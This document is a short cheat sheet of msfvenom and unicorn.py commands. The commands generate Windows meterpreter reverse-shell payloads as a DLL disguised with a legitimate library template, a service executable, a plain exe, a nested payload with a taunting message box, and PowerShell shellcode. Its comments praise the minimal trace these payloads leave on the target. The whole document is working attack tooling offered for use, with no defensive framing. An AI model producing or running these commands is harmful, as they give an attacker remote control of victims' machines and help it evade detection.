### MSFVENOM Payloads

# DLL Payload
msfvenom --platform windows --arch x86 --format dll --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=443 --template nss3_legit.dll --keep > nss3.dll

# Custom Windows Service Payload
msfvenom --platform windows --arch x86 --format exe-service --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=443 > winmalservice.exe

# Custom Generic EXE Payload
msfvenom --platform windows --arch x86 --format exe --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=443 > winmal.exe

### Nested Payloads
# Message Box
msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=INFORMATION TITLE="Sorry" TEXT="You got pwned bro!" --format raw > Payload1
msfvenom --add-code Payload1 --arch x86 --platform windows --payload windows/meterpreter_reverse_tcp LHOST=$lhost LPORT=443 --format exe > demo.exe

# Unicorn Payloads (No exe's! Just paste in the shellcode and bam you have a reverse shell! Great entry points on the system since it leaves minimal trace 
# (python unicorn.py <meterpreter> <LHOST> <PORT>) then (cat powershell_attack.txt) to copy the shellcode and paste it into the windows box. Once you are in your meterpreter session, be sure to run load stdapi or nothing will work
python3 unicorn.py windows/meterpreter/reverse_https $lhost 389

python3 unicorn.py windows/meterpreter/reverse_https $lhost 443

python3 unicorn.py windows/meterpreter/reverse_https $lhost 445

python3 unicorn.py windows/meterpreter/reverse_https $lhost 3389
